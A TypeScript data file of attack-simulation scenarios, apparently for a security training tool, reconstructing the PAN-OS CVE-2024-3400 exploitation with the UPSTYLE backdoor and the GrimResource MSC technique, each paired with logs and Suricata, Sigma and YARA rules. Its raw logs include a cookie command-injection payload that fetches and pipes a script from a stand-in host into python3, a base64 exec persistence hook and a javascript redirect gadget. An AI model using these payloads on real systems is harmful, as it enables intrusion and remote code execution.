import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & ZERO-DAY SCENARIOS — PALO ALTO UNIT 42 & ELASTIC SECURITY LABS
 * ============================================================================
 * Strictly extracted from official technical threat research reports:
 * 1. Palo Alto Networks Unit 42: Operation MidnightEclipse (CVE-2024-3400 & UPSTYLE)
 * 2. Elastic Security Labs: GrimResource (MSC & apds.dll XSS-to-RCE, T1218.014)
 * 3. Elastic Security Labs: Lotus Blossom APT (WinGUp Sideloading & CHRYSALIS Backdoor)
 * 4. Palo Alto Networks Unit 42: Muddled Libra / Scattered Spider (SSO to AWS & ESXi)
 * 5. Elastic Security Labs: APT41 / Brass Typhoon (DodgeBox & DUSTPAN Loader)
 */

export const UNIT42_PANOS_MIDNIGHT_ECLIPSE_SCENARIO: AttackScenario = {
  id: 'unit42-panos-midnight-eclipse',
  code: 'CVE-2024-3400',
  name: 'Unit 42 — Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor',
  shortSubtitle: 'Palo Alto Unit 42 · CVE-2024-3400 Telemetry Cron Injection & system.pth Persistence',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Palo Alto Networks Unit 42 (UTA0218 / Operation MidnightEclipse), threat actors exploited CVE-2024-3400 (CVSS 10.0) in PAN-OS GlobalProtect gateway portals. By injecting arbitrary shell commands inside the HTTP SESSID cookie path traversal (/opt/panlogs/tmp/device_telemetry/minute/), attackers forced the root device_telemetry cron job to execute curl/wget payloads, deploying the Python-based UPSTYLE in-memory backdoor via /usr/lib/python3.6/site-packages/system.pth.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Palo Alto Networks Unit 42 — Operation MidnightEclipse (CVE-2024-3400)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1059.004 (Unix Shell) · T1546.016 (Python .pth)',
    },
    {
      term: 'BACKDOOR ARTIFACT',
      value: 'UPSTYLE (/usr/lib/python3.6/site-packages/system.pth & sslvpn-access.log)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: '/opt/panlogs/tmp/device_telemetry/minute/ & /var/log/pan/gpsvc.log',
    },
  ],
  nodes: [
    {
      id: 'uta0218_actor',
      label: 'UTA0218 Threat Actor',
      sublabel: '198.51.100.77 (Exploit & Stage Host)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Infrastructure (UTA0218)',
        pidOrPort: 'HTTPS :443 -> /global-protect/login.esp',
        privilege: 'Unauthenticated External',
        artifacts: [
          'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/a`curl ...`',
          'HTTP Stage: update.py (UPSTYLE Installer)',
        ],
        description:
          'UTA0218 operator sending crafted HTTP POST requests to GlobalProtect with shell backticks embedded in the SESSID cookie header.',
      },
    },
    {
      id: 'panos_gateway',
      label: 'PAN-OS GlobalProtect Edge',
      sublabel: '172.16.10.5 (CVE-2024-3400 Target)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'PAN-OS Gateway Appliance (Linux Kernel)',
        pidOrPort: 'TCP/443 (sslvpnd / gpsvc)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/opt/panlogs/tmp/device_telemetry/minute/',
          '/var/log/pan/sslvpn-access.log',
        ],
        description:
          'Internet-facing GlobalProtect portal where malformed SESSID cookies create arbitrary filenames in the device_telemetry minute directory.',
      },
    },
    {
      id: 'upstyle_python',
      label: 'UPSTYLE Python Backdoor',
      sublabel: 'system.pth (In-Memory Monitor)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Python 3.6 Runtime Hook (system.pth)',
        pidOrPort: 'PID 18422 · /proc/self/cmdline',
        privilege: 'root',
        artifacts: [
          '/usr/lib/python3.6/site-packages/system.pth',
          '/usr/local/bin/pan_web_install/lib/python3.6/site-packages/system.pth',
        ],
        description:
          'UPSTYLE persistence script loaded automatically by Python via system.pth, parsing img[...] regex commands from sslvpn-access.log.',
      },
    },
    {
      id: 'pan_config_store',
      label: 'PAN-OS Config & Running XML',
      sublabel: '/opt/pancfg/mgmt/saved-configs',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Appliance Configuration & Credential Store',
        pidOrPort: 'running-config.xml & master key',
        privilege: 'Appliance Root Store',
        artifacts: [
          '/opt/pancfg/mgmt/saved-configs/running-config.xml',
          '/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css',
        ],
        description:
          'PAN-OS configuration repository extracted by the attacker and written to bootstrap.min.css for unauthenticated HTTP retrieval before restoration.',
      },
    },
    {
      id: 'cortex_xdr_siem',
      label: 'Unit 42 / Cortex XDR SIEM',
      sublabel: 'Syslog & Auditd Telemetry Collector',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Threat Hunting Platform',
        pidOrPort: 'PAN-OS System Logs & Linux Auditd',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Threat ID 95187 / 95189 / 95191',
          'Auditd execve dt_curl & system.pth creation',
        ],
        description:
          'Monitors PAN-OS gpsvc logs, unexpected zero-byte files in device_telemetry/minute, and Python .pth startup modifications.',
      },
    },
  ],
  processTree: [
    {
      pid: 2410,
      ppid: 1,
      name: 'gpsvc (GlobalProtect)',
      commandLine: '/usr/local/bin/gpsvc -c /etc/pan/gpsvc.conf',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['open("/opt/panlogs/tmp/device_telemetry/minute/...")', 'close'],
    },
    {
      pid: 17904,
      ppid: 17900,
      name: 'dt_curl / cron shell',
      commandLine:
        '/bin/sh -c curl -s http://198.51.100.77/update.py | python3',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: ['fork', 'execve("/bin/sh")', 'socket(AF_INET, SOCK_STREAM)'],
    },
    {
      pid: 18422,
      ppid: 1,
      name: 'python3 (UPSTYLE system.pth)',
      commandLine: 'python3 -m SimpleHTTPServer (hooked via system.pth)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: [
        'open("/proc/self/cmdline")',
        'inotify_add_watch("/var/log/pan/sslvpn-access.log")',
        'os.popen(cmd)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F9B40100000',
          section: 'system.pth -> exec(base64.b64decode(...))',
          permissions: 'RWX',
          size: '48 KB',
          status: 'injected',
          description:
            'In-memory Python thread spawned by system.pth watching sslvpn-access.log for img[...] base64 commands.',
          hexPreview: 'import os,re,time,base64,threading; pattern=r"img\\[([a-zA-Z0-9+/=]+)\\]"',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400)',
      subtitle: 'Arbitrary file creation in /opt/panlogs/tmp/device_telemetry/minute/',
      description:
        'As documented by Unit 42, the attacker sends an HTTPS POST request to /global-protect/login.esp with a directory traversal payload inside the SESSID cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aa`curl...`. The GlobalProtect daemon (gpsvc) creates a zero-byte file whose filename contains the backtick-enclosed shell command.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['uta0218_actor', 'panos_gateway', 'cortex_xdr_siem'],
      compromisedNodeIds: ['panos_gateway'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2024-3400 (CVSS 10.0 Unauthenticated RCE)' },
        { term: 'HTTP HEADER', value: 'Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/' },
        { term: 'TARGET DAEMON', value: 'gpsvc / sslvpnd on TCP 443' },
      ],
    },
    {
      index: 2,
      title: 'TELEMETRY CRON SHELL EXECUTION (DT_CURL)',
      subtitle: 'Root cron job passes unsanitized filename to shell',
      description:
        'Every minute, the PAN-OS device telemetry cron job executes dt_curl to bundle and transmit telemetry files. Because filenames in /opt/panlogs/tmp/device_telemetry/minute/ are interpolated directly into a shell command without sanitization, the backtick payload executes as root, fetching and piping update.py directly into python3.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['panos_gateway', 'uta0218_actor', 'upstyle_python'],
      compromisedNodeIds: ['panos_gateway', 'upstyle_python'],
      keySpecs: [
        { term: 'CRON SCRIPT', value: 'dt_curl (Device Telemetry Minute Job)' },
        { term: 'STAGER URL', value: 'curl -s http://198.51.100.77/update.py | python3' },
        { term: 'EXECUTION CONTEXT', value: 'uid=0(root) gid=0(root)' },
      ],
    },
    {
      index: 3,
      title: 'UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2',
      subtitle: 'Writing system.pth and parsing sslvpn-access.log for img[...] commands',
      description:
        'The update.py dropper writes a malicious startup hook to /usr/lib/python3.6/site-packages/system.pth. Whenever any Python process starts on the appliance, system.pth decodes the UPSTYLE backdoor, inspects /proc/self/cmdline, and monitors /var/log/pan/sslvpn-access.log for HTTP requests matching img\\[(.*?)\\]. Output is written into bootstrap.min.css and the original CSS file is restored 15 seconds later.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1546.016',
      mitreTechniqueName: 'Event Triggered Execution: Installer Packages / Python .pth',
      activeNodeIds: ['upstyle_python', 'pan_config_store', 'cortex_xdr_siem'],
      compromisedNodeIds: ['panos_gateway', 'upstyle_python', 'pan_config_store'],
      keySpecs: [
        { term: 'PERSISTENCE FILE', value: '/usr/lib/python3.6/site-packages/system.pth' },
        { term: 'C2 TRIGGER REGEX', value: 'img\\[([a-zA-Z0-9+/=]+)\\] in sslvpn-access.log' },
        { term: 'EXFIL & CLEANUP', value: 'Writes output to bootstrap.min.css + restores running.bak' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'u42-pan-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:14:02.118',
      sourceNodeId: 'uta0218_actor',
      targetNodeId: 'panos_gateway',
      sourceLabel: '198.51.100.77',
      targetLabel: 'PAN-OS GP :443',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / Threat 95187',
      shortAction: 'SESSID TRAVERSAL',
      info: 'POST /global-protect/login.esp Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/a`curl...`',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Unit 42 documented that CVE-2024-3400 exploitation begins with a crafted SESSID cookie traversing into /opt/panlogs/tmp/device_telemetry/minute/ and embedding shell commands inside backticks.',
      rawLog: `POST /global-protect/login.esp HTTP/1.1
Host: 172.16.10.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aa\`curl${'${IFS}'}-s${'${IFS}'}http://198.51.100.77/update.py|python3\`
Content-Type: application/x-www-form-urlencoded
Content-Length: 0`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Unit 42 — PAN-OS GlobalProtect CVE-2024-3400 SESSID Path Traversal',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"UNIT42 PAN-OS CVE-2024-3400 SESSID Path Traversal"; flow:established,to_server; http.cookie; content:"SESSID="; content:"/opt/panlogs/tmp/device_telemetry/"; distance:0; classtype:attempted-admin; sid:9518701; rev:1;)`,
        mitigation:
          'Apply PAN-OS hotfixes (10.2.9-h1, 11.0.4-h1, 11.1.2-h3) and enable Threat Prevention IDs 95187, 95189, and 95191.',
      },
    },
    {
      id: 'u42-pan-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:15:00.042',
      sourceNodeId: 'panos_gateway',
      targetNodeId: 'upstyle_python',
      sourceLabel: 'dt_curl (root)',
      targetLabel: 'python3 update.py',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd SYSCALL 59',
      shortAction: 'CRON RCE (ROOT)',
      info: 'SYSCALL execve /bin/sh -c "curl -s http://198.51.100.77/update.py | python3" uid=0',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'When the minute telemetry cron job runs, the shell evaluates the backtick expression inside the filename and executes update.py as root.',
      rawLog: `type=SYSCALL msg=audit(1712891700.042:8841): arch=c000003e syscall=59 success=yes exit=0 a0=55a8c120 a1=55a8c190 a2=55a8c1b0 a3=8 items=2 ppid=17900 pid=17904 auid=4294967295 uid=0 gid=0 euid=0 tty=(none) comm="sh" exe="/bin/bash"
type=EXECVE msg=audit(1712891700.042:8841): argc=3 a0="/bin/sh" a1="-c" a2="curl -s http://198.51.100.77/update.py | python3"
[gpsvc.log] Error: failed to open telemetry file /opt/panlogs/tmp/device_telemetry/minute/aa`,
      detectionRule: {
        type: 'SIGMA',
        title: 'PAN-OS Telemetry Cron Spawning Outbound Curl / Python Stager',
        ruleCode: `title: PAN-OS CVE-2024-3400 Root Telemetry Command Injection
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: 'EXECVE'
    a2|contains:
      - 'device_telemetry'
      - 'update.py'
      - 'system.pth'
  condition: selection
level: critical`,
        mitigation:
          'Inspect /var/log/pan/device_telemetry_send.log and /opt/panlogs/tmp/device_telemetry/minute/ for shell metacharacters.',
      },
    },
    {
      id: 'u42-pan-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:15:04.619',
      sourceNodeId: 'upstyle_python',
      targetNodeId: 'pan_config_store',
      sourceLabel: 'UPSTYLE (system.pth)',
      targetLabel: 'bootstrap.min.css / running-config',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'YARA UPSTYLE_Backdoor',
      shortAction: 'SYSTEM.PTH HOOK',
      info: 'Writes /usr/lib/python3.6/site-packages/system.pth & watches sslvpn-access.log for img[...]',
      sizeOrCode: '4,128 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1546.016',
      explanation:
        'UPSTYLE achieves fileless-style execution on Python startup via system.pth, reading commands from invalid 404 requests in sslvpn-access.log and writing command output to bootstrap.min.css before restoring running.bak.',
      rawLog: `[FILE_WRITE] /usr/lib/python3.6/site-packages/system.pth
import os,sys,base64;exec(base64.b64decode('aW1wb3J0IG9zLHJlLHRpbWUsYmFzZTY0LHRocmVhZGluZztkZWYgcheck():...'))
[SSLVPN-ACCESS.LOG] 198.51.100.77 - - "GET /global-protect/portal/images/img[Y2F0IC9vcHQvcGFuY2ZnL21nbXQvc2F2ZWQtY29uZmlncy9ydW5uaW5nLWNvbmZpZy54bWw=] HTTP/1.1" 404
[CLEANUP] shutil.move("/var/appweb/sslvpndocs/global-protect/portal/css/running.bak", ".../bootstrap.min.css")`,
      detectionRule: {
        type: 'YARA',
        title: 'Unit 42 Official YARA — Python UPSTYLE Backdoor (system.pth)',
        ruleCode: `rule PaloAlto_Unit42_UPSTYLE_Backdoor {
  meta:
    author = "Palo Alto Networks Unit 42"
    reference = "Operation MidnightEclipse CVE-2024-3400"
  strings:
    $s1 = "/var/log/pan/sslvpn-access.log" ascii
    $s2 = "/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css" ascii
    $s3 = "img\\\\[([a-zA-Z0-9+/=]+)\\\\]" ascii
    $s4 = "/proc/self/cmdline" ascii
  condition:
    3 of ($s*)
}`,
        mitigation:
          'Perform a factory reset and redeploy compromised PAN-OS images; rotate all device credentials and private certificates stored in running-config.xml.',
      },
    },
  ],
};

export const ELASTIC_GRIMRESOURCE_MSC_SCENARIO: AttackScenario = {
  id: 'elastic-grimresource-msc',
  code: 'T1218.014',
  name: 'Elastic Security Labs — GrimResource: MMC & apds.dll XSS-to-RCE Execution',
  shortSubtitle: 'Elastic Security Labs · Crafted .MSC Console File, apds.dll Redirect & DotNetToJScript',
  category: 'MALWARE',
  severity: 'HIGH',
  primaryMitrePhase: 4,
  overview:
    'Discovered by Elastic Security Labs (June 2024), GrimResource is a defense-evasion and execution technique that abuses a DOM Cross-Site Scripting (XSS) flaw inside the legacy Windows library C:\\Windows\\System32\\apds.dll. When a user opens a crafted Microsoft Management Console (.msc) file, mmc.exe loads apds.dll/redirect.html via the res:// protocol, triggering arbitrary JScript/VBScript execution (DotNetToJScript) and stealthily injecting a C2 payload into dllhost.exe.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Elastic Security Labs — GrimResource (Joe Desimone & Samir Bousseaden)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1218.014 (MMC) · T1059.005 (VBScript) · T1055.002 (PE Injection)',
    },
    {
      term: 'VULNERABLE MODULE',
      value: 'res://apds.dll/redirect.html?target=javascript:eval(...)',
    },
    {
      term: 'SACRIFICIAL TARGET',
      value: 'C:\\Windows\\System32\\dllhost.exe (Spawned by mmc.exe)',
    },
  ],
  nodes: [
    {
      id: 'grim_lure_delivery',
      label: 'Malicious .MSC Delivery',
      sublabel: 'sccm-Updater.msc (XML Console File)',
      role: 'attacker',
      x: 15,
      y: 42,
      details: {
        osOrType: 'Crafted XML Microsoft Saved Console (.msc)',
        pidOrPort: 'SHA256: 142b7c3... (GrimResource Sample)',
        privilege: 'User Phishing Lure',
        artifacts: [
          'sccm-Updater.msc',
          'StringTable: res://apds.dll/redirect.html?target=javascript:...',
        ],
        description:
          'Specially crafted XML .msc file containing an embedded APDS redirect URI and obfuscated VBScript/DotNetToJScript loader in its StringTable.',
      },
    },
    {
      id: 'wks_mmc_host',
      label: 'mmc.exe (Management Console)',
      sublabel: 'PID 5412 · WKS-FIN-08 (10.10.4.28)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Windows 11 Enterprise · Signed Microsoft Binary',
        pidOrPort: 'PID 5412 · C:\\Windows\\System32\\mmc.exe',
        privilege: 'Medium / High Integrity',
        artifacts: [
          'Loaded Module: C:\\Windows\\System32\\apds.dll',
          'Loaded Module: C:\\Windows\\System32\\vbscript.dll / jscript.dll',
        ],
        description:
          'Trusted Windows Microsoft Management Console process that parses sccm-Updater.msc and evaluates the res://apds.dll/redirect.html DOM XSS payload.',
      },
    },
    {
      id: 'dotnet_to_jscript_mem',
      label: 'apds.dll & DotNetToJScript',
      sublabel: 'In-Memory CLR v4.0.30319 Deserialization',
      role: 'memory',
      x: 52,
      y: 72,
      details: {
        osOrType: 'In-Memory ActiveX & .NET BinaryFormatter',
        pidOrPort: 'clr.dll + mscoree.dll inside mmc.exe',
        privilege: 'User-Mode RWX Heap',
        artifacts: [
          'ActCtx: TransformNode / msxml3.dll',
          'System.Reflection.Assembly.Load(byte[])',
        ],
        description:
          'Uses transformNode XSLT inside the apds.dll HTML context to invoke DotNetToJScript, deserializing a C# Cobalt Strike loader in memory.',
      },
    },
    {
      id: 'dllhost_sacrificial',
      label: 'Injected dllhost.exe',
      sublabel: 'PID 6088 (COM Surrogate Target)',
      role: 'process',
      x: 78,
      y: 34,
      details: {
        osOrType: 'Sacrificial Windows COM Surrogate',
        pidOrPort: 'PID 6088 · PPID 5412 (mmc.exe)',
        privilege: 'Medium Integrity',
        artifacts: [
          'DirtyCLR / Indirect Syscalls (NtAllocateVirtualMemory)',
          'Sysmon Event ID 8 / 10',
        ],
        description:
          'Child dllhost.exe spawned by the .NET loader inside mmc.exe and injected with shellcode via indirect syscalls.',
      },
    },
    {
      id: 'elastic_defend_siem',
      label: 'Elastic Defend & SIEM',
      sublabel: 'EQL Correlation & Sysmon EID 1 / 7',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Elastic Security EDR & SIEM',
        pidOrPort: 'Sysmon EID 1, 7 (ImageLoad), 10',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Rule: GrimResource MMC Loading apds.dll & Script Engines',
          'YARA: Windows_Trojan_GrimResource',
        ],
        description:
          'Detects mmc.exe loading apds.dll alongside vbscript.dll/clr.dll and spawning suspicious child processes.',
      },
    },
  ],
  processTree: [
    {
      pid: 5412,
      ppid: 3200,
      name: 'mmc.exe',
      commandLine: '"C:\\Windows\\System32\\mmc.exe" "C:\\Users\\j.doe\\Downloads\\sccm-Updater.msc"',
      user: 'CORP\\j.doe',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'LoadLibraryW("apds.dll")',
        'LoadLibraryW("vbscript.dll")',
        'CLRCreateInstance',
      ],
      memoryBlocks: [
        {
          address: '0x000001F4A2000000',
          section: 'CLR Heap (DotNetToJScript Loader)',
          permissions: 'RWX',
          size: '256 KB',
          status: 'injected',
          description:
            'Deserialized .NET assembly loaded inside mmc.exe via apds.dll DOM XSS and XSLT transformNode.',
          hexPreview: '4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00',
        },
      ],
    },
    {
      pid: 6088,
      ppid: 5412,
      name: 'dllhost.exe',
      commandLine: 'C:\\Windows\\System32\\dllhost.exe',
      user: 'CORP\\j.doe',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: [
        'NtAllocateVirtualMemory',
        'NtWriteVirtualMemory',
        'NtProtectVirtualMemory(PAGE_EXECUTE_READ)',
        'NtCreateThreadEx',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'MMC PARSES CRAFTED .MSC & LOADS APDS.DLL',
      subtitle: 'res://apds.dll/redirect.html DOM XSS triggered inside mmc.exe',
      description:
        'As uncovered by Elastic Security Labs, the victim opens sccm-Updater.msc, which launches the trusted Windows binary mmc.exe. Inside the .msc XML StringTable, an entry references res://apds.dll/redirect.html?target=javascript:eval(...). Because redirect.html in apds.dll passes the target parameter directly to window.location.replace without validation, arbitrary JavaScript executes inside the MMC ActiveX View context.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1218.014',
      mitreTechniqueName: 'System Binary Proxy Execution: MMC',
      activeNodeIds: ['grim_lure_delivery', 'wks_mmc_host', 'elastic_defend_siem'],
      compromisedNodeIds: ['wks_mmc_host'],
      keySpecs: [
        { term: 'PROXY BINARY', value: 'C:\\Windows\\System32\\mmc.exe (T1218.014)' },
        { term: 'XSS GADGET', value: 'res://apds.dll/redirect.html?target=javascript:...' },
        { term: 'IMAGE LOADS', value: 'Sysmon EID 7: apds.dll + jscript.dll + vbscript.dll' },
      ],
    },
    {
      index: 2,
      title: 'XSLT TRANSFORMNODE & DOTNETTOJSCRIPT CLR LOAD',
      subtitle: 'Obfuscated VBScript deserializes C# loader into mmc.exe memory',
      description:
        'To bypass modern Windows Script Host mitigations, the injected JavaScript creates an MSXML ActiveX object and invokes transformNode with an embedded XSLT stylesheet containing VBScript. The VBScript executes a DotNetToJScript payload, loading the .NET Common Language Runtime (clr.dll) directly inside mmc.exe and deserializing an in-memory C# loader.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.005',
      mitreTechniqueName: 'Command and Scripting Interpreter: Visual Basic',
      activeNodeIds: ['wks_mmc_host', 'dotnet_to_jscript_mem', 'elastic_defend_siem'],
      compromisedNodeIds: ['wks_mmc_host', 'dotnet_to_jscript_mem'],
      keySpecs: [
        { term: 'EXECUTION BRIDGE', value: 'MSXML transformNode -> Embedded XSLT VBScript' },
        { term: 'IN-MEMORY LOADER', value: 'DotNetToJScript (BinaryFormatter Deserialization)' },
        { term: 'CLR ARTIFACT', value: 'mmc.exe loads clr.dll & mscoree.dll (Unusual for non-.NET snap-in)' },
      ],
    },
    {
      index: 3,
      title: 'SACRIFICIAL DLLHOST.EXE SPAWN & INDIRECT SYSCALL INJECTION',
      subtitle: 'mmc.exe spawns dllhost.exe and injects Cobalt Strike via DirtyCLR',
      description:
        'The deserialized .NET assembly (dubbed DirtyCLR by Elastic researchers) spawns a sacrificial C:\\Windows\\System32\\dllhost.exe child process and uses indirect syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) to inject the final Cobalt Strike Beacon payload.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1055.002',
      mitreTechniqueName: 'Process Injection: Portable Executable Injection',
      activeNodeIds: ['dotnet_to_jscript_mem', 'dllhost_sacrificial', 'elastic_defend_siem'],
      compromisedNodeIds: ['wks_mmc_host', 'dotnet_to_jscript_mem', 'dllhost_sacrificial'],
      keySpecs: [
        { term: 'PARENT -> CHILD', value: 'mmc.exe (PID 5412) -> dllhost.exe (PID 6088)' },
        { term: 'INJECTION METHOD', value: 'Indirect Syscalls (NtAllocateVirtualMemory + NtWriteVirtualMemory)' },
        { term: 'DETECTION SIGNAL', value: 'Sysmon EID 1 (mmc->dllhost) + EID 7 (apds.dll)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'el-grim-1',
      no: 1,
      stageIndex: 1,
      timestamp: '11:22:08.104',
      sourceNodeId: 'grim_lure_delivery',
      targetNodeId: 'wks_mmc_host',
      sourceLabel: 'sccm-Updater.msc',
      targetLabel: 'mmc.exe (PID 5412)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7',
      shortAction: 'LOAD APDS.DLL',
      info: 'Image=C:\\Windows\\System32\\mmc.exe ImageLoaded=C:\\Windows\\System32\\apds.dll',
      sizeOrCode: 'Signed MS DLL',
      severity: 'HIGH',
      mitreId: 'T1218.014',
      explanation:
        'Elastic Security Labs identified that mmc.exe loading C:\\Windows\\System32\\apds.dll is the primary behavioral indicator of the GrimResource technique.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>7</EventID>
    <Computer>WKS-FIN-08.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\mmc.exe</Data>
    <Data Name="ImageLoaded">C:\\Windows\\System32\\apds.dll</Data>
    <Data Name="Signed">true</Data>
    <Data Name="Signature">Microsoft Windows</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Elastic Security Labs — GrimResource MMC Loading apds.dll (Sysmon EID 7)',
        ruleCode: `title: GrimResource Exploitation via MMC Loading apds.dll
logsource:
  category: image_load
  product: windows
detection:
  selection:
    Image|endswith: '\\mmc.exe'
    ImageLoaded|endswith: '\\apds.dll'
  condition: selection
level: high`,
        mitigation:
          'Block untrusted .msc files from email/web gateways and monitor mmc.exe loading apds.dll alongside jscript.dll or vbscript.dll.',
      },
    },
    {
      id: 'el-grim-2',
      no: 2,
      stageIndex: 2,
      timestamp: '11:22:08.512',
      sourceNodeId: 'wks_mmc_host',
      targetNodeId: 'dotnet_to_jscript_mem',
      sourceLabel: 'mmc.exe (apds.dll)',
      targetLabel: 'CLR / vbscript.dll',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7 (CLR)',
      shortAction: 'DOTNETTOJSCRIPT',
      info: 'Image=mmc.exe ImageLoaded=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll',
      sizeOrCode: 'In-Memory CLR',
      severity: 'HIGH',
      mitreId: 'T1059.005',
      explanation:
        'Following apds.dll load, the XSLT transformNode gadget executes VBScript/JScript to load clr.dll and deserialize the DirtyCLR assembly in memory.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>7</EventID>
    <Computer>WKS-FIN-08.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\mmc.exe</Data>
    <Data Name="ImageLoaded">C:\\Windows\\System32\\vbscript.dll</Data>
    <Data Name="Description">Microsoft (R) VBScript</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'YARA',
        title: 'Elastic Security Labs YARA — Windows.Trojan.GrimResource (.MSC File)',
        ruleCode: `rule Windows_Trojan_GrimResource_MSC {
  meta:
    author = "Elastic Security Labs"
    description = "Detects MSC files abusing apds.dll redirect.html (GrimResource)"
  strings:
    $msc = "<MMC_ConsoleFile" ascii wide nocase
    $apds = "apds.dll/redirect.html" ascii wide nocase
    $js = "javascript:" ascii wide nocase
  condition:
    $msc and $apds and $js
}`,
        mitigation:
          'Scan inbound .msc attachments for references to apds.dll/redirect.html and embedded ActiveX/XSLT script blocks.',
      },
    },
    {
      id: 'el-grim-3',
      no: 3,
      stageIndex: 3,
      timestamp: '11:22:09.190',
      sourceNodeId: 'dotnet_to_jscript_mem',
      targetNodeId: 'dllhost_sacrificial',
      sourceLabel: 'mmc.exe (PID 5412)',
      targetLabel: 'dllhost.exe (PID 6088)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 & 8',
      shortAction: 'INJECT DLLHOST.EXE',
      info: 'ParentImage=mmc.exe Image=C:\\Windows\\System32\\dllhost.exe (No CLI Args)',
      sizeOrCode: 'PID 6088',
      severity: 'CRITICAL',
      mitreId: 'T1055.002',
      explanation:
        'Legitimate COM surrogate dllhost.exe always includes /Processid:{GUID} arguments. Here, mmc.exe spawns a bare dllhost.exe and injects Cobalt Strike via indirect syscalls.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>WKS-FIN-08.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">6088</Data>
    <Data Name="Image">C:\\Windows\\System32\\dllhost.exe</Data>
    <Data Name="CommandLine">C:\\Windows\\System32\\dllhost.exe</Data>
    <Data Name="ParentProcessId">5412</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\mmc.exe</Data>
